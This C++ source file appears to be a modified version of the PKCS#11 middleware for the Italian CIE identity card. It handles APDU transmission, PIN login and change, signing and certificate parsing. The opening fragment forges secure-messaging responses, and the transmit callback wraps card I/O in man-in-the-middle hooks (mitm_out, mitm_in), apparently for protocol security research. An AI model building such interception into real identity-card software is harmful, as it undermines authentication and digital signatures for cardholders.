				uint8_t sw[2] = {0x90, 0x00};
				ByteDynArray respBa;
				ByteDynArray swBa = VarToByteDynArray(sw);
				ByteDynArray data;
				data = datafield.append(VarToByteDynArray(macTail));
				ByteDynArray ccfb;
				ccfb.setASN1Tag(0x8e, smMac);
				respBa.set(&data, &ccfb, &swBa);
				memcpy(resp, respBa.data(), *respSize);
			} else {
				LOG_BUFFER(resp, *respSize);
				BYTE temp[16] = {};
				memcpy(temp, resp, 16); 
				ByteDynArray respBa = VarToByteArray(temp);
				ByteArray crafted_resp = craft_respSM(sessENC_IFD, sessMAC_IFD, respBa, sessSSC_IFD);
				memcpy(resp, crafted_resp.data(), 16);
			}
		break;
	default:
		break;
	}
}

int TokenTransmitCallback(CSlot *data, BYTE *apdu, DWORD apduSize, BYTE *resp, DWORD *respSize) {
	
	LOG_DEBUG("TokenTransmitCallback - Apdu:");
    LOG_BUFFER(apdu, apduSize);

	if (apduSize == 2) {
		WORD code = *(WORD*)apdu;
		if (code == 0xfffd) {
			long bufLen = *respSize;
			*respSize = sizeof(data->hCard)+2;
            CryptoPP::memcpy_s(resp, bufLen, &data->hCard, sizeof(data->hCard));
			resp[sizeof(data->hCard)] = 0;
			resp[sizeof(data->hCard) + 1] = 0;

			return SCARD_S_SUCCESS;
		}
		else if (code == 0xfffe) {
			DWORD protocol = 0;
			ODS("UNPOWER CARD");
            auto ris = SCardReconnect(data->hCard, SCARD_SHARE_SHARED, SCARD_PROTOCOL_Tx, SCARD_UNPOWER_CARD, &protocol);
            
            
			if (ris == SCARD_S_SUCCESS) {
                SCardBeginTransaction(data->hCard);
				*respSize = 2;
				resp[0] = 0x90;
				resp[1] = 0x00;
			}
			return ris;
		}
		else if (code == 0xffff) {
			DWORD protocol = 0;
			auto ris = SCardReconnect(data->hCard, SCARD_SHARE_SHARED, SCARD_PROTOCOL_Tx, SCARD_RESET_CARD, &protocol);
			if (ris == SCARD_S_SUCCESS) {
                SCardBeginTransaction(data->hCard);
				*respSize = 2;
				resp[0] = 0x90;
				resp[1] = 0x00;
			}
			ODS("RESET CARD");
			return ris;
		}
	}
    
    //Log.writePure("APDU: %s", dumpHexData(ByteArray(apdu, apduSize)).c_str());
                  
	//ODS(String().printf("APDU: %s\n", dumpHexData(ByteArray(apdu, apduSize), String()).lock()).lock());
	// START MITM
    mitm_out(apdu, apduSize, data->hCard, SCARD_PCI_T1);
	auto ris = SCardTransmit(data->hCard, SCARD_PCI_T1, apdu, apduSize, NULL, resp, respSize);
    mitm_in(resp, respSize);
	// END MITM
    
	LOG_DEBUG("TokenTransmitCallback - Smart card response:");
    LOG_BUFFER(resp, *respSize);

	if(ris == SCARD_W_RESET_CARD || ris == SCARD_W_UNPOWERED_CARD)
    {
        LOG_ERROR("TokenTransmitCallback - Card reset error: %x", ris);
        
        DWORD protocol = 0;
        ris = SCardReconnect(data->hCard, SCARD_SHARE_SHARED, SCARD_PROTOCOL_Tx, SCARD_LEAVE_CARD, &protocol);
        if (ris != SCARD_S_SUCCESS)
        {
            LOG_ERROR("TokenTransmitCallback - Errore reconnect %d", ris);
        }
        else{
            ris = SCardTransmit(data->hCard, SCARD_PCI_T1, apdu, apduSize, NULL, resp, respSize);
			LOG_DEBUG("TokenTransmitCallback - Smart card response:");
            LOG_BUFFER(resp, *respSize); 
		}
    }
    
    if (ris != SCARD_S_SUCCESS) {
        LOG_ERROR("TokenTransmitCallback - APDU transmission error: %x", ris);
	}
	//else 
		//ODS(String().printf("RESP: %s\n", dumpHexData(ByteArray(resp, *respSize), String()).lock()).lock());
	
	return ris;
}

class CIEData {
public:
	CK_USER_TYPE userType;
	CAES aesKey;
	CToken token;
	bool init;
	CIEData(CSlot *slot,ByteArray atr) : ias((CToken::TokenTransmitCallback)TokenTransmitCallback,atr), slot(*slot) {
		ByteDynArray key(32);
		ByteDynArray iv(16);
		aesKey.Init(key.random(),iv.random());
		token.setTransmitCallbackData(slot);
		userType = -1;
		init = false;
	}
	CSlot &slot;
	IAS ias;
	std::shared_ptr<CP11PublicKey> pubKey;
	std::shared_ptr<CP11PrivateKey> privKey;
	std::shared_ptr<CP11Certificate> cert;
	ByteDynArray SessionPIN;
};

void CIEtemplateInitLibrary(class CCardTemplate &Template, void *templateData){ return; }
void CIEtemplateInitCard(void *&pTemplateData, CSlot &pSlot){
	init_func
	ByteArray ATR;
	pSlot.GetATR(ATR);

	pTemplateData = new CIEData(&pSlot, ATR);
}
void CIEtemplateFinalCard(void *pTemplateData){ 
	if (pTemplateData)
		delete (CIEData*)pTemplateData;
}

ByteArray SkipZero(ByteArray &ba) {
	for (DWORD i = 0; i < ba.size(); i++) {
		if (ba[i] != 0)
			return ba.mid(i);
	}
	return ByteArray();
}

BYTE label[] = { 'C','I','E','0' };
void CIEtemplateInitSession(void *pTemplateData){ 
	CIEData* cie=(CIEData*)pTemplateData;

	if (!cie->init) {
		ByteDynArray certRaw;
		cie->slot.Connect();
		{
			safeConnection faseConn(cie->slot.hCard);
			CCardLocker lockCard(cie->slot.hCard);
			cie->ias.SetCardContext(&cie->slot);
			cie->ias.SelectAID_IAS();
			cie->ias.ReadPAN();
			
			ByteDynArray resp;
			cie->ias.SelectAID_CIE();
			cie->ias.ReadDappPubKey(resp);
			cie->ias.InitEncKey();
			cie->ias.GetCertificate(certRaw, true);
		}

        
		CK_BBOOL vtrue = TRUE;
		CK_BBOOL vfalse = FALSE;

        cie->pubKey = std::make_shared<CP11PublicKey>(cie);
        cie->privKey = std::make_shared<CP11PrivateKey>(cie);
        cie->cert = std::make_shared<CP11Certificate>(cie);
        
        cie->pubKey->addAttribute(CKA_LABEL, VarToByteArray(label));
        cie->pubKey->addAttribute(CKA_ID, VarToByteArray(label));
        cie->pubKey->addAttribute(CKA_PRIVATE, VarToByteArray(vfalse));
        cie->pubKey->addAttribute(CKA_TOKEN, VarToByteArray(vtrue));
        cie->pubKey->addAttribute(CKA_VERIFY, VarToByteArray(vtrue));
        CK_KEY_TYPE keyrsa = CKK_RSA;
        cie->pubKey->addAttribute(CKA_KEY_TYPE, VarToByteArray(keyrsa));
        
        cie->privKey->addAttribute(CKA_LABEL, VarToByteArray(label));
        cie->privKey->addAttribute(CKA_ID, VarToByteArray(label));
        cie->privKey->addAttribute(CKA_PRIVATE, VarToByteArray(vtrue));
        cie->privKey->addAttribute(CKA_TOKEN, VarToByteArray(vtrue));
        cie->privKey->addAttribute(CKA_KEY_TYPE, VarToByteArray(keyrsa));
        
        cie->privKey->addAttribute(CKA_SIGN, VarToByteArray(vtrue));
        
        cie->cert->addAttribute(CKA_LABEL, VarToByteArray(label));
        cie->cert->addAttribute(CKA_ID, VarToByteArray(label));
        cie->cert->addAttribute(CKA_PRIVATE, VarToByteArray(vfalse));
        cie->cert->addAttribute(CKA_TOKEN, VarToByteArray(vtrue));
        
        CK_CERTIFICATE_TYPE certx509 = CKC_X_509;
        cie->cert->addAttribute(CKA_CERTIFICATE_TYPE, VarToByteArray(certx509));
        
        //LOG_DEBUG("CIEtemplateInitSession - certRaw: %s", dumpHexData(certRaw).c_str());

#ifdef WIN32
		PCCERT_CONTEXT certDS = CertCreateCertificateContext(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, certRaw.data(), (DWORD)certRaw.size());
		if (certDS != nullptr) {
			auto _1 = scopeExit([&]() noexcept {CertFreeCertificateContext(certDS); });

			

			CASNParser keyParser;
			keyParser.Parse(ByteArray(certDS->pCertInfo->SubjectPublicKeyInfo.PublicKey.pbData, certDS->pCertInfo->SubjectPublicKeyInfo.PublicKey.cbData));
			auto Module = SkipZero(keyParser.tags[0]->tags[0]->content);
			auto Exponent = SkipZero(keyParser.tags[0]->tags[1]->content);
			CK_LONG keySizeBits = (CK_LONG)Module.size() * 8;
			
            cie->pubKey->addAttribute(CKA_MODULUS, Module);
			cie->pubKey->addAttribute(CKA_PUBLIC_EXPONENT, Exponent);
			cie->pubKey->addAttribute(CKA_MODULUS_BITS, VarToByteArray(keySizeBits));
			
			

			
			cie->privKey->addAttribute(CKA_MODULUS, Module);
			cie->privKey->addAttribute(CKA_PUBLIC_EXPONENT, Exponent);
			
			cie->cert->addAttribute(CKA_ISSUER, ByteArray(certDS->pCertInfo->Issuer.pbData, certDS->pCertInfo->Issuer.cbData));
			cie->cert->addAttribute(CKA_SERIAL_NUMBER, ByteArray(certDS->pCertInfo->SerialNumber.pbData, certDS->pCertInfo->SerialNumber.cbData));
			cie->cert->addAttribute(CKA_SUBJECT, ByteArray(certDS->pCertInfo->Subject.pbData, certDS->pCertInfo->Subject.cbData));
			
			CK_DATE start, end;
			SYSTEMTIME sFrom, sTo;
			char temp[10];
			if (!FileTimeToSystemTime(&certDS->pCertInfo->NotBefore, &sFrom))
				throw logged_error("Errore nella data di inizio validita' certificato");
			if (!FileTimeToSystemTime(&certDS->pCertInfo->NotAfter, &sTo))
				throw logged_error("Errore nella data di fine validita' certificato");
			snprintf_s(temp, 10, "%04i", sFrom.wYear); VarToByteArray(start.year).copy(ByteArray((BYTE*)temp, 4));
			snprintf_s(temp, 10, "%02i", sFrom.wMonth); VarToByteArray(start.month).copy(ByteArray((BYTE*)temp, 2));
			snprintf_s(temp, 10, "%02i", sFrom.wDay); VarToByteArray(start.day).copy(ByteArray((BYTE*)temp, 2));
			snprintf_s(temp, 10, "%04i", sTo.wYear); VarToByteArray(end.year).copy(ByteArray((BYTE*)temp, 2));
			snprintf_s(temp, 10, "%02i", sTo.wMonth); VarToByteArray(end.month).copy(ByteArray((BYTE*)temp, 2));
			snprintf_s(temp, 10, "%02i", sTo.wDay); VarToByteArray(end.day).copy(ByteArray((BYTE*)temp, 2));
			cie->cert->addAttribute(CKA_START_DATE, VarToByteArray(start));
			cie->cert->addAttribute(CKA_END_DATE, VarToByteArray(end));
		}
#else
        // TODO decode the certificate

        // not before
        // not after
        // modulus
        // public exponent
        // issuer
        // serialnumber
        // subject
        
        CryptoPP::ByteQueue certin;
        certin.Put(certRaw.data(),certRaw.size());
        
        
        
        std::string serial;
        CryptoPP::ByteQueue issuer;
        CryptoPP::ByteQueue subject;
        std::string notBefore;
        std::string notAfter;
        CryptoPP::Integer mod;
        CryptoPP::Integer pubExp;
        
        GetCertInfo(certin, serial, issuer, subject, notBefore, notAfter, mod, pubExp);
        
        ByteDynArray modulus(mod.ByteCount());
        mod.Encode(modulus.data(), modulus.size());
        
        ByteDynArray publicExponent(pubExp.ByteCount());
        pubExp.Encode(publicExponent.data(), publicExponent.size());
        
        CK_LONG keySizeBits = (CK_LONG)modulus.size() * 8;
        
        cie->pubKey->addAttribute(CKA_MODULUS, modulus);
        cie->pubKey->addAttribute(CKA_PUBLIC_EXPONENT, publicExponent);
        cie->pubKey->addAttribute(CKA_MODULUS_BITS, VarToByteArray(keySizeBits));
        
        cie->privKey->addAttribute(CKA_MODULUS, modulus);
        cie->privKey->addAttribute(CKA_PUBLIC_EXPONENT, publicExponent);
        
        ByteDynArray issuerBa(issuer.CurrentSize());
        issuer.Get(issuerBa.data(), issuerBa.size());
        
        ByteDynArray subjectBa(subject.CurrentSize());
        subject.Get(subjectBa.data(), subjectBa.size());
        
        cie->cert->addAttribute(CKA_ISSUER, issuerBa);
        cie->cert->addAttribute(CKA_SERIAL_NUMBER, ByteArray((BYTE*)serial.c_str(), serial.size()));
        cie->cert->addAttribute(CKA_SUBJECT, subjectBa);
    
        
        CK_DATE start, end;
        
        SYSTEMTIME sFrom, sTo;
        sFrom = convertStringToSystemTime(notBefore.c_str());
        sTo = convertStringToSystemTime(notAfter.c_str());
        
        cie->cert->addAttribute(CKA_START_DATE, VarToByteArray(start));
        cie->cert->addAttribute(CKA_END_DATE, VarToByteArray(end));
        
        // add to the object
#endif
        
        size_t len = GetASN1DataLenght(certRaw);
        cie->cert->addAttribute(CKA_VALUE, certRaw.left(len));
        
        cie->slot.AddP11Object(cie->pubKey);
        cie->slot.AddP11Object(cie->privKey);
        cie->slot.AddP11Object(cie->cert);
        
		cie->init = true;
	}
}
void CIEtemplateFinalSession(void *pTemplateData){ 
	//delete (CIEData*)pTemplateData;
}

bool CIEtemplateMatchCard(CSlot &pSlot){
	init_func
	CToken token;

	pSlot.Connect();
	{
		safeConnection faseConn(pSlot.hCard);
		ByteArray ATR;
		pSlot.GetATR(ATR);
		token.setTransmitCallback((CToken::TokenTransmitCallback)TokenTransmitCallback, &pSlot);
		IAS ias((CToken::TokenTransmitCallback)TokenTransmitCallback, ATR);
		ias.SetCardContext(&pSlot);
		{
			safeTransaction trans(faseConn,SCARD_LEAVE_CARD);
			ias.SelectAID_IAS();
			ias.ReadPAN();
		}
		return true;
	}
}

ByteDynArray  CIEtemplateGetSerial(CSlot &pSlot) {
	init_func
		CToken token;

	pSlot.Connect();
	{
		safeConnection faseConn(pSlot.hCard);
		CCardLocker lockCard(pSlot.hCard);
		ByteArray ATR;
		pSlot.GetATR(ATR);
		IAS ias((CToken::TokenTransmitCallback)TokenTransmitCallback, ATR);
		ias.SetCardContext(&pSlot);
		ias.SelectAID_IAS();
		ias.ReadPAN();
		std::string numSerial;
		dumpHexData(ias.PAN.mid(5, 6), numSerial, false);
		return ByteArray((BYTE*)numSerial.c_str(),numSerial.length());
	}
}
void CIEtemplateGetModel(CSlot &pSlot, std::string &szModel){ 
	szModel = ""; 
}
void CIEtemplateGetTokenFlags(CSlot &pSlot, CK_FLAGS &dwFlags){
	dwFlags = CKF_LOGIN_REQUIRED | CKF_USER_PIN_INITIALIZED | CKF_TOKEN_INITIALIZED | CKF_REMOVABLE_DEVICE;
}

void CIEtemplateLogin(void *pTemplateData, CK_USER_TYPE userType, ByteArray &Pin) {
	init_func
	CToken token;
	CIEData* cie = (CIEData*)pTemplateData;

	cie->SessionPIN.clear();
	cie->userType = -1;

	cie->slot.Connect();
	cie->ias.SetCardContext(&cie->slot);
	cie->ias.token.Reset();
	{
		safeConnection safeConn(cie->slot.hCard);
		CCardLocker lockCard(cie->slot.hCard);

		cie->ias.SelectAID_IAS();
		cie->ias.SelectAID_CIE();
		cie->ias.InitDHParam();

		if (cie->ias.DappPubKey.isEmpty()) {
			ByteDynArray DappKey;			
			cie->ias.ReadDappPubKey(DappKey);
		}

		cie->ias.InitExtAuthKeyParam();
		// faccio lo scambio di chiavi DH	
		if (cie->ias.Callback != nullptr)
			cie->ias.Callback(1, "DiffieHellman", cie->ias.CallbackData);
		cie->ias.DHKeyExchange();
		// DAPP
		if (cie->ias.Callback != nullptr)
			cie->ias.Callback(2, "DAPP", cie->ias.CallbackData);
		cie->ias.DAPP();
		// verifica PIN
		StatusWord sw;
		if (cie->ias.Callback != nullptr)
			cie->ias.Callback(3, "Verify PIN", cie->ias.CallbackData);
		if (userType == CKU_USER) {
			ByteDynArray FullPIN;
			cie->ias.GetFirstPIN(FullPIN);
			FullPIN.append(Pin);
			sw = cie->ias.VerifyPIN(FullPIN);
		}
		else if (userType == CKU_SO) {
			sw = cie->ias.VerifyPUK(Pin);
		}
		else
			throw p11_error(CKR_ARGUMENTS_BAD);

		if (sw == 0x6983) {
			if (userType == CKU_USER)
            {
                notifyPINLocked();
				//cie->ias.IconaSbloccoPIN();
                throw p11_error(CKR_PIN_LOCKED);
            }
		}
		if (sw >= 0x63C0 && sw <= 0x63CF) {
			int attemptsRemaining = sw - 0x63C0;
            notifyPINWrong(attemptsRemaining);
			throw p11_error(CKR_PIN_INCORRECT);
		}
		if (sw == 0x6700) {
            notifyPINWrong(-1);
			throw p11_error(CKR_PIN_INCORRECT);
		}
		if (sw == 0x6300)
        {
            notifyPINWrong(-1);
			throw p11_error(CKR_PIN_INCORRECT);
        }
		if (sw != 0x9000) {
			throw scard_error(sw);
		}
        
		cie->SessionPIN = cie->aesKey.Encode(Pin);
		cie->userType = userType;
	}
}
void CIEtemplateLogout(void *pTemplateData, CK_USER_TYPE userType){
	CIEData* cie = (CIEData*)pTemplateData;
	cie->userType = -1;
	cie->SessionPIN.clear();
}
void CIEtemplateReadObjectAttributes(void *pCardTemplateData, CP11Object *pObject){
}
void CIEtemplateSign(void *pCardTemplateData, CP11PrivateKey *pPrivKey, ByteArray &baSignBuffer, ByteDynArray &baSignature, CK_MECHANISM_TYPE mechanism, bool bSilent){
	init_func
	CToken token;
	CIEData* cie = (CIEData*)pCardTemplateData;
	if (cie->userType == CKU_USER) {
		ByteDynArray Pin;
		cie->slot.Connect();
		cie->ias.SetCardContext(&cie->slot);
		cie->ias.token.Reset();
		{
			safeConnection safeConn(cie->slot.hCard);
			CCardLocker lockCard(cie->slot.hCard);
            
			Pin = cie->aesKey.Decode(cie->SessionPIN);
			cie->ias.SelectAID_IAS();
			cie->ias.SelectAID_CIE();
			cie->ias.DHKeyExchange();
			cie->ias.DAPP();

			ByteDynArray FullPIN;
			cie->ias.GetFirstPIN(FullPIN);
			FullPIN.append(Pin);
			if (cie->ias.VerifyPIN(FullPIN) != 0x9000)
				throw p11_error(CKR_PIN_INCORRECT);
			cie->ias.Sign(baSignBuffer, baSignature);
		}
	}
}

void CIEtemplateInitPIN(void *pCardTemplateData, ByteArray &baPin){ 
	init_func
	CToken token;
	CIEData* cie = (CIEData*)pCardTemplateData;
	if (cie->userType == CKU_SO) {
		// posso usarla solo se sono loggato come so
		ByteDynArray Pin;
		cie->slot.Connect();
		cie->ias.SetCardContext(&cie->slot);
		cie->ias.token.Reset();
		{
			safeConnection safeConn(cie->slot.hCard);
			CCardLocker lockCard(cie->slot.hCard);
            
			Pin = cie->aesKey.Decode(cie->SessionPIN);
			cie->ias.SelectAID_IAS();
			cie->ias.SelectAID_CIE();

			cie->ias.DHKeyExchange();
			cie->ias.DAPP();
			if (cie->ias.VerifyPUK(Pin)!=0x9000)
				throw p11_error(CKR_PIN_INCORRECT);

			if(cie->ias.UnblockPIN()!=0x9000)
				throw p11_error(CKR_GENERAL_ERROR);

			ByteDynArray changePIN;
			cie->ias.GetFirstPIN(changePIN);
			changePIN.append(baPin);

			if (cie->ias.ChangePIN(changePIN)!=0x9000)
				throw p11_error(CKR_GENERAL_ERROR);
		}
	}
	else
		throw p11_error(CKR_FUNCTION_NOT_SUPPORTED);
}

void CIEtemplateSetPIN(void *pCardTemplateData, ByteArray &baOldPin, ByteArray &baNewPin, CK_USER_TYPE User)
{
	init_func
	CToken token;
	CIEData* cie = (CIEData*)pCardTemplateData;
	if (cie->userType != CKU_SO) {
		// posso usarla sia se sono loggato come user sia se non sono loggato
		ByteDynArray Pin;
		cie->slot.Connect();
		cie->ias.SetCardContext(&cie->slot);
		cie->ias.token.Reset();
		{
			safeConnection safeConn(cie->slot.hCard);
			CCardLocker lockCard(cie->slot.hCard);
			cie->ias.SelectAID_IAS();
			if (cie->userType != CKU_USER)
				cie->ias.InitDHParam();
			cie->ias.SelectAID_CIE();

			if (cie->userType != CKU_USER) {
				cie->ias.ReadPAN();
				ByteDynArray resp;
				cie->ias.ReadDappPubKey(resp);
			}

			cie->ias.DHKeyExchange();
			cie->ias.DAPP();
			ByteDynArray oldPIN, newPIN;
			cie->ias.GetFirstPIN(oldPIN);
			newPIN = oldPIN;
			oldPIN.append(baOldPin);
			newPIN.append(baNewPin);

			if (cie->ias.VerifyPIN(oldPIN) != 0x9000)
				throw p11_error(CKR_PIN_INCORRECT);
			if (cie->ias.ChangePIN(oldPIN, newPIN) != 0x9000)
				throw p11_error(CKR_GENERAL_ERROR);
		}
	}
	else
		throw p11_error(CKR_FUNCTION_NOT_SUPPORTED);
}

void CIEtemplateSignRecover(void *pCardTemplateData, CP11PrivateKey *pPrivKey, ByteArray &baSignBuffer, ByteDynArray &baSignature, CK_MECHANISM_TYPE mechanism, bool bSilent){ throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }
void CIEtemplateDecrypt(void *pCardTemplateData, CP11PrivateKey *pPrivKey, ByteArray &baEncryptedData, ByteDynArray &baData, CK_MECHANISM_TYPE mechanism, bool bSilent){ throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }
void CIEtemplateGenerateRandom(void *pCardTemplateData, ByteArray &baRandomData){ throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }
CK_ULONG CIEtemplateGetObjectSize(void *pCardTemplateData, CP11Object *pObject) { throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }
void CIEtemplateSetKeyPIN(void *pTemplateData, CP11Object *pObject, ByteArray &Pin){ throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }
void CIEtemplateSetAttribute(void *pTemplateData, CP11Object *pObject, CK_ATTRIBUTE_PTR pTemplate, CK_ULONG ulCount){ throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }
std::shared_ptr<CP11Object> CIEtemplateCreateObject(void *pTemplateData, CK_ATTRIBUTE_PTR pTemplate, CK_ULONG ulCount) { throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }
void CIEtemplateDestroyObject(void *pTemplateData, CP11Object &Object){ throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }
std::shared_ptr<CP11Object> CIEtemplateGenerateKey(void *pCardTemplateData, CK_MECHANISM_PTR pMechanism, CK_ATTRIBUTE_PTR pTemplate, CK_ULONG ulCount) { throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }
void CIEtemplateGenerateKeyPair(void *pCardTemplateData, CK_MECHANISM_PTR pMechanism, CK_ATTRIBUTE_PTR pPublicKeyTemplate, CK_ULONG ulPublicKeyAttributeCount, CK_ATTRIBUTE_PTR pPrivateKeyTemplate, CK_ULONG ulPrivateKeyAttributeCount, std::shared_ptr<CP11Object>&pPublicKey, std::shared_ptr<CP11Object>&pPrivateKey) { throw p11_error(CKR_FUNCTION_NOT_SUPPORTED); }


/**
 * Reads an X.509 v3 certificate from certin, extracts the subjectPublicKeyInfo structure
 * (which is one way PK_Verifiers can get their key material) and writes it to keyout
 *
 * @throws CryptoPP::BERDecodeError
 */

void GetPublicKeyFromCert(CryptoPP::BufferedTransformation & certin,
                          CryptoPP::BufferedTransformation & keyout,
                          CryptoPP::BufferedTransformation & issuer,
                          
                          Integer &serial)
{
    BERSequenceDecoder x509Cert(certin);
    BERSequenceDecoder tbsCert(x509Cert);
    
    // ASN.1 from RFC 3280
    // TBSCertificate  ::=  SEQUENCE  {
    // version         [0]  EXPLICIT Version DEFAULT v1,
    
    // consume the context tag on the version
    BERGeneralDecoder context(tbsCert,0xa0);
    word32 ver;
    
    // only want a v3 cert
    BERDecodeUnsigned<word32>(context,ver,INTEGER,2,2);
    
    // serialNumber         CertificateSerialNumber,
    serial.BERDecode(tbsCert);
    
    // signature            AlgorithmIdentifier,
    BERSequenceDecoder signature(tbsCert);
    signature.SkipAll();
    
    // issuer               Name,
    BERSequenceDecoder issuerName(tbsCert);
    issuerName.CopyTo(issuer);
    issuerName.SkipAll();
    
    // validity             Validity,
    BERSequenceDecoder validity(tbsCert);
    validity.SkipAll();
    
    // subject              Name,
    BERSequenceDecoder subjectName(tbsCert);
    subjectName.SkipAll();
    
    // subjectPublicKeyInfo SubjectPublicKeyInfo,
    BERSequenceDecoder spki(tbsCert);
    DERSequenceEncoder spkiEncoder(keyout);
    
    spki.CopyTo(spkiEncoder);
    spkiEncoder.MessageEnd();
    
    spki.SkipAll();
    tbsCert.SkipAll();
    x509Cert.SkipAll();
}



void GetCertInfo(CryptoPP::BufferedTransformation & certin,
                 std::string & serial,
                 CryptoPP::BufferedTransformation & issuer,
                 CryptoPP::BufferedTransformation & subject,
                 std::string & notBefore,
                 std::string & notAfter,
                 CryptoPP::Integer& mod,
                 CryptoPP::Integer& pubExp)
{

    BERSequenceDecoder cert(certin);
    
    BERSequenceDecoder toBeSignedCert(cert);
    
    // consume the context tag on the version
    BERGeneralDecoder context(toBeSignedCert,0xa0);
    word32 ver;
    
    // only want a v3 cert
    BERDecodeUnsigned<word32>(context,ver,INTEGER,2,2);
    
    serial = CryptoppUtils::Cert::ReadIntegerAsString(toBeSignedCert);

    // algorithmId
    CryptoppUtils::Cert::SkipNextSequence(toBeSignedCert);
    
    
    // issuer               Name,
    BERSequenceDecoder issuerName(toBeSignedCert);
    DERSequenceEncoder issuerEncoder(issuer);
    issuerName.CopyTo(issuerEncoder);
    issuerEncoder.MessageEnd();
    
//    issuerName.CopyTo(issuer);
    issuerName.SkipAll();
    
//    CryptoPP::BERSequenceDecoder issuer(toBeSignedCert); {
//        CryptoPP::BERSetDecoder c(issuer);
//        c.SkipAll();
//        CryptoPP::BERSetDecoder st(issuer);
//        st.SkipAll();
//        CryptoPP::BERSetDecoder l(issuer);
//        l.SkipAll();
//        CryptoPP::BERSetDecoder o(issuer);
//        o.SkipAll();
//        CryptoPP::BERSetDecoder ou(issuer);
//        ou.SkipAll();
//        CryptoPP::BERSetDecoder cn(issuer); {
//            CryptoPP::BERSequenceDecoder attributes(cn); {
//                CryptoPP::BERGeneralDecoder ident(
//                                                attributes,
//                                                CryptoPP::OBJECT_IDENTIFIER);
//                ident.SkipAll();
//                CryptoPP::BERDecodeTextString(
//                                              attributes,
//                                              issuerCN,
//                                              CryptoPP::UTF8_STRING);
//            }
//        }
//    }
//
//    issuer.SkipAll();
    
    // validity
    CryptoppUtils::Cert::ReadDateTimeSequence(toBeSignedCert, notBefore, notAfter);

    // subject
    BERSequenceDecoder subjectName(toBeSignedCert);
    DERSequenceEncoder subjectEncoder(subject);
    subjectName.CopyTo(subjectEncoder);
    subjectEncoder.MessageEnd();
    
//    subjectName.CopyTo(subject);
    subjectName.SkipAll();
//
//    CryptoPP::BERSequenceDecoder subject(toBeSignedCert); {
//        CryptoPP::BERSetDecoder c(subject);
//        c.SkipAll();
//        CryptoPP::BERSetDecoder st(subject);
//        st.SkipAll();
//        CryptoPP::BERSetDecoder l(subject);
//        l.SkipAll();
//        CryptoPP::BERSetDecoder o(subject);
//        o.SkipAll();
//        CryptoPP::BERSetDecoder ou(subject);
//        ou.SkipAll();
//        CryptoPP::BERSetDecoder cn(subject); {
//            CryptoPP::BERSequenceDecoder attributes(cn); {
//                CryptoPP::BERGeneralDecoder ident(
//                                                  attributes,
//                                                  CryptoPP::OBJECT_IDENTIFIER);
//                ident.SkipAll();
//                CryptoPP::BERDecodeTextString(
//                                              attributes,
//                                              subjectCN,
//                                              CryptoPP::UTF8_STRING);
//            }
//
//            subject.SkipAll();
//        }
//    }
    
    // Public key
    CryptoPP::BERSequenceDecoder publicKey(toBeSignedCert); {
        CryptoPP::BERSequenceDecoder ident(publicKey);
        ident.SkipAll();
        CryptoPP::BERGeneralDecoder key(publicKey, CryptoPP::BIT_STRING);
        key.Skip(1);  // Must skip (possibly a bug in Crypto++)
        CryptoPP::BERSequenceDecoder keyPair(key);
        
        mod.BERDecode(keyPair);
        pubExp.BERDecode(keyPair);
        
        
    }
    
    publicKey.SkipAll();
    toBeSignedCert.SkipAll();
    cert.SkipAll();
}

        
